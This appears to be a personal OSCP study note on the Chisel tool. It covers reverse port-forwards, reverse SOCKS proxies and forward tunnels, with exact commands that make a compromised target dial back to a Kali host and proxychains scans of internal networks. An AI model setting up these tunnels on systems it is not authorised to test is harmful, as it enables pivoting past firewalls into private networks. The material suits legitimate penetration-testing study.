# Chisel — Port Forwarding & Tunneling (OSCP)

Fast TCP tunnel over HTTP(S). One Go binary is **both** the server and the client. Use it to reach a service that's only listening on the target's `127.0.0.1` (or to pivot into an internal subnet) from your Kali box.

> **Not installed on Kali by default** (only [[Ligolo]] is on `Defalt`). Grab the static binary from https://github.com/jpillora/chisel/releases (`chisel_*_linux_amd64.gz` → `gunzip` → `chmod +x`) and transfer it to the target like any other tool ([[File_Transfer]]). Same binary name/arch on both ends is fine.

---

## Chisel vs Ligolo — which to reach for

| Need                                                                              | Tool                                       | Why                                                                    |
| --------------------------------------------------------------------------------- | ------------------------------------------ | ---------------------------------------------------------------------- |
| Forward **one or two** internal/loopback ports (e.g. Jenkins on `127.0.0.1:8080`) | **Chisel** reverse port-forward            | one line, no TUN, no proxychains                                       |
| Route an **entire internal subnet** transparently (multi-host pivot)              | **[[Ligolo]]**                             | TUN interface, every tool works natively                               |
| Route a whole subnet but Ligolo isn't available                                   | **Chisel** reverse **SOCKS** + proxychains | same reach as Ligolo, but every command must be prefixed `proxychains` |

> Ligolo routes subnets but **does not** cover the agent's `127.0.0.1` by default. For a single *loopback* service, chisel's reverse port-forward is the simpler tool — which is why walkthroughs reach for it there.

---

## Reverse Port-Forward — expose ONE target-loopback port on Kali

The go-to for "there's a service on the target's `127.0.0.1:8080` I need to browse." **Reverse** = the target dials back to Kali, so it works even when you can't connect *into* the target (firewall/NAT).

**Kali — start the server (listener):**
```bash
./chisel server --reverse --port 8081
```
→ `--reverse` lets clients request reverse tunnels; `--port 8081` is chisel's own control port (target connects here).

**Target — connect back and request the forward:**
```bash
./chisel client <KALI_IP>:8081 R:8082:127.0.0.1:8080
```
→ `R:8082:127.0.0.1:8080` = **R**everse: open **8082 on Kali**, forward everything to the target's **`127.0.0.1:8080`**. Read it as `R:<kali_port>:<dest_as_seen_from_target>`.

**Kali — use it:** the internal service is now local.
```
http://127.0.0.1:8082
```

---

## Reverse SOCKS — the Ligolo-style "whole network" mode

When you need to reach a **range of internal hosts/ports** (not just one) and don't have Ligolo, run a reverse **SOCKS** proxy and send tools through it with proxychains.

**Kali — server (same as above):**
```bash
./chisel server --reverse --port 8081
```

**Target — request a SOCKS tunnel instead of a fixed port:**
```bash
./chisel client <KALI_IP>:8081 R:1080:socks
```
→ opens a **SOCKS5 proxy on Kali `127.0.0.1:1080`** that egresses from the target.

**Kali — point proxychains at it** (`/etc/proxychains4.conf`, bottom):
```
socks5 127.0.0.1 1080
```
**Then prefix any tool:**
```bash
proxychains nmap -sT -Pn -p 80,443,8080 <internal_ip>
proxychains curl http://<internal_ip>:8080
```
> proxychains only tunnels **TCP** and needs `-sT` (connect scan) for nmap — SYN scans and ICMP won't traverse SOCKS. This is the trade-off vs Ligolo's TUN, where a normal `nmap`/ping just works.

---

## Forward Port-Forward (less common)

When *you* can already reach the chisel server on the target and want to pull a port toward you, drop `--reverse` and omit the `R:`:
```bash
# target
./chisel server --port 8081
# kali
./chisel client <TARGET_IP>:8081 8082:127.0.0.1:8080
```
→ opens 8082 on Kali → target's `127.0.0.1:8080`. In OSCP the **reverse** form above is almost always the right one (target reaches back to you).

---

## Related Notes

- [[Ligolo]]
- [[File_Transfer]]
- [[Linux_Priv_Esc]]
